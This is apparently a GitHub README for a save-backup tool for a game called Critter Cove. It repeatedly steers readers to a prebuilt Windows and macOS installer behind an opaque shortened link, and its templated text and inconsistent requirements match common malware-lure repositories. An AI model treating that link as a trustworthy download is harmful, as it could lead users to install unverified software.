![Critter Cove Desktop](assets/hero.png)

# Critter Cove Desktop

*Keep the cove on disk before a shop update.*

## About

This repository is **Critter Cove Desktop**, a desktop helper. Keep the cove on disk before a shop update.

Critter Cove saves sit next to Steam clouds.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Finds the Critter Cove folder.
- Copies island and shop files.
- Lists harbor photo albums.
- Prints a short keep report.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/tgonzalez57/critter-cove-desktop

MIT license. See `LICENSE`.
